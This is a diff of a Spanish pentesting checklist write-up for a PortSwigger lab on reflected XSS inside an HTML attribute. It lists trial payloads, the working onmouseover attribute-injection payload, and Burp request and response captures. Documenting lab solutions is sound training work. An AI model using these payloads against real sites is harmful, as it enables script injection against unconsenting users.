@@ -4,13 +4,13 @@
 
 <summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>
 
-### AUDITORIA DE: ((Laboratorio: XSS reflejado en atributo con corchetes angulares codificados en HTML))
+#### AUDITORIA DE: ((Laboratorio: XSS reflejado en atributo con corchetes angulares codificados en HTML))
 
 ***
 
 ***
 
-#### RECONOCIMIENTO PASIVO
+**RECONOCIMIENTO PASIVO**
 
 *   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
@@ -28,14 +28,12 @@
                                 <input type="text" placeholder="Search the blog..." name="search" value="P4IM0N" onmouseover="javascript:alert('P4IM0N-XSS')<!--&quot;">
                                 <button type="submit" class="button">Search</button>
     </form>
-    
+
     ```
 
-    ![XSSentreCORCHETS_ANGULARES](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/19b4767d-a7ad-4dac-9c37-966dd2881c5c)
+    ![XSSentreCORCHETS\_ANGULARES](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/19b4767d-a7ad-4dac-9c37-966dd2881c5c)
 
-    ![PAYLOADparaXSSentreCORCHETES_ANGULARES](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/187d5ee5-56aa-4bd6-9cf4-bea59760f67b)
-
-
+    ![PAYLOADparaXSSentreCORCHETES\_ANGULARES](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/187d5ee5-56aa-4bd6-9cf4-bea59760f67b)
 
     * CONCLUSION: TUVIMOS QUE IMPLEMENTAR UNA CARGA DEL VALOR P4IM0N PARA QUE SE COMPLETE EN EL VALOR DE VALUE Y CERRAMOS CON " LUEGO PAAR EVITAR EL USO DE CORCHETES ANGULARES(MAYOR Y MEOR QUE), DIRECTAMENTE EJECUTAMOS JAVASCRIPT:ALERT Y LO TERMINAMOS CON UN COMENTARIO POR QUE NOS CARGABA AL ULTIMO UNA CODIFICACION QUE INTERRUMPIA LA EJECUCION DEL PAYLOAD, Y BINGO LO RESOLVIMOS.
 
@@ -51,7 +49,7 @@
 
 <summary>🔬 ANALISIS FORENSE ❌</summary>
 
-#### ANALISIS FORENSE
+**ANALISIS FORENSE**
 
 *   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics.md)
 
@@ -248,7 +246,7 @@
 
 <summary>👊 RECONOCIMIENTO ACTIVO ❌</summary>
 
-#### RECONOCIMIENTO ACTIVO
+**RECONOCIMIENTO ACTIVO**
 
 *   [ ] PING👈 --------------------------------->[https://www.kali.org/tools/fping/](https://www.kali.org/tools/fping/)
 
@@ -683,7 +681,7 @@
 
 <summary>🕵️ INVESTIGACION OSINT ❌</summary>
 
-#### INVESTIGACION OSINT
+**INVESTIGACION OSINT**
 
 *   [ ] OSINT Framework👈 --------------------------------->[https://osintframework.com/](https://osintframework.com/)
 
@@ -880,7 +878,7 @@
 
 <summary>⛓️ HASHES Y DESENCRIPTADOS ❌</summary>
 
-#### HASHES Y DESENCRIPTADOS
+**HASHES Y DESENCRIPTADOS**
 
 *   [ ] JOHN THE RIPPER👈 --------------------------------->[https://www.kali.org/tools/john/ ](https://www.kali.org/tools/john/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/john-the-ripper)
 
@@ -1105,7 +1103,7 @@
 
 <summary>💪 FUERZA BRUTA A LOGINS ❌</summary>
 
-#### FUERZA BRUTA A LOGINS
+**FUERZA BRUTA A LOGINS**
 
 *   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)
 
@@ -1267,7 +1265,7 @@
 
 <summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ✔️</summary>
 
-#### SCRIPT DE EXPLOIT Y PAYLOADS
+**SCRIPT DE EXPLOIT Y PAYLOADS**
 
 *   [x] NOSOTROS Y CHAT GPT👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
@@ -1277,34 +1275,34 @@
 
 
     </h1><script>alert('P4IM0N-XSS')</script>
-    
-    
-    
+
+
+
     "<script>alert('P4IM0N-XSS')</script>
-    
-    
+
+
     &quot;</h1><script>alert('P4IM0N-XSS')</script>
-    
-    
+
+
     "><script>alert('P4IM0N-XSS')</script>
-    
-    
+
+
     P4IM0N"><script>alert('P4IM0N-XSS')</script>      ------> (CARGO  P4IM0N bien dentro de parametro VALUE)
-    
-    
+
+
     P4IM0N" onmouseover=<script>alert('P4IM0N-XSS')</script>
-    
-    
+
+
     P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')
-    
-    
+
+
     P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')<!--
-    
-    
-    
+
+
+
     PAYLOAD QUE FUNCIONO:
-    
-    
+
+
     P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')<!--
     ```
 
@@ -1322,7 +1320,7 @@
 
 <summary>🤯 EXPLOTACION ✔️</summary>
 
-#### EXPLOTACION
+**EXPLOTACION**
 
 *   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
@@ -1348,19 +1346,19 @@
     Referer: https://0a6900d60325fb2e82c3ec8200f20038.web-security-academy.net/
     Accept-Encoding: gzip, deflate, br
     Accept-Language: es-419,es;q=0.9,en;q=0.8
-    
-    
-    
+
+
+
     RESPONSE NORMAL:
-    
-    
-    
-    
+
+
+
+
     HTTP/2 200 OK
     Content-Type: text/html; charset=utf-8
     X-Frame-Options: SAMEORIGIN
     Content-Length: 3209
-    
+
     <!DOCTYPE html>
     <html>
         <head>
@@ -1427,27 +1425,27 @@
             </div>
         </body>
     </html>
-    
-    
-    
+
+
+
     ---------
-    
+
     NO SE LOGRA LA INYECCION DEL PAYLOAD POR UNA MEDIDAD E SEGURIDAD POR CODIFICACION:
-    
+
     El HTML codifica caracteres especiales utilizando entidades HTML. En tu payload, los caracteres <, >, y ' están codificados de la siguiente manera:
-    
+
     < se codifica como &lt;
     > se codifica como &gt;
     ' se codifica como &apos;
-    
-    
-    
-    
-    
+
+
+
+
+
     REQUEST CON PAYLOAD (</h1><script>alert('P4IM0N-XSS')</script>):
-    
-    
-    
+
+
+
     GET /?search=</h1><script>alert('P4IM0N-XSS')</script> HTTP/2
     Host: 0a6900d60325fb2e82c3ec8200f20038.web-security-academy.net
     Cookie: session=KCXh7QYsqFuXFgcuy3GN7h1rUXFmA9Pk
@@ -1465,20 +1463,20 @@
     Referer: https://0a6900d60325fb2e82c3ec8200f20038.web-security-academy.net/
     Accept-Encoding: gzip, deflate, br
     Accept-Language: es-419,es;q=0.9,en;q=0.8
-    
-    
-    
-    
+
+
+
+
     RESPONSE CON PAYLOAD (</h1><script>alert('P4IM0N-XSS')</script>):
-    
-    
-    
-    
+
+
+
+
     HTTP/2 200 OK
     Content-Type: text/html; charset=utf-8
     X-Frame-Options: SAMEORIGIN
     Content-Length: 3323
-    
+
     <!DOCTYPE html>
     <html>
         <head>
@@ -1545,22 +1543,22 @@
             </div>
         </body>
     </html>
-    
-    
-    
-    
-    
-    
-    
-    
+
+
+
+
+
+
+
+
     ---------
-    
-    
-    
+
+
+
     REQUEST CON PAYLOAD QUE FUNCIONO  (P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')<!--):
-    
-    
-    
+
+
+
     GET /?search=P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')<!-- HTTP/2
     Host: 0a44003a04838d0480d9cc2b004a00f8.web-security-academy.net
     Cookie: session=pW7PaffTE9Xl2bLIMjsxyBUn98ObQMql
@@ -1579,20 +1577,20 @@
     Accept-Encoding: gzip, deflate, br
     Accept-Language: es-419,es;q=0.9,en;q=0.8
     Connection: close
-    
-    
-    
-    
+
+
+
+
     RESPONSE CON PAYLOAD QUE FUNCIONO  (P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')<!--):
-    
-    
-    
-    
+
+
+
+
     HTTP/2 200 OK
     Content-Type: text/html; charset=utf-8
     X-Frame-Options: SAMEORIGIN
     Content-Length: 3324
-    
+
     <!DOCTYPE html>
     <html>
         <head>
@@ -1675,7 +1673,7 @@
 
 <summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS ❌</summary>
 
-#### ESCALADA DE PRIVILEGIOS WINDOWS
+**ESCALADA DE PRIVILEGIOS WINDOWS**
 
 *   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
@@ -1935,7 +1933,7 @@
 
 <summary>🐧 ESCALADA DE PRIVILEGIOS LINUX ❌</summary>
 
-#### ESCALADA DE PRIVILEGIOS LINUX
+**ESCALADA DE PRIVILEGIOS LINUX**
 
 *   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
@@ -2160,7 +2158,7 @@
 
 <summary>♻️ PIVOTING ❌</summary>
 
-#### PIVOTING
+**PIVOTING**
 
 *   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)
 
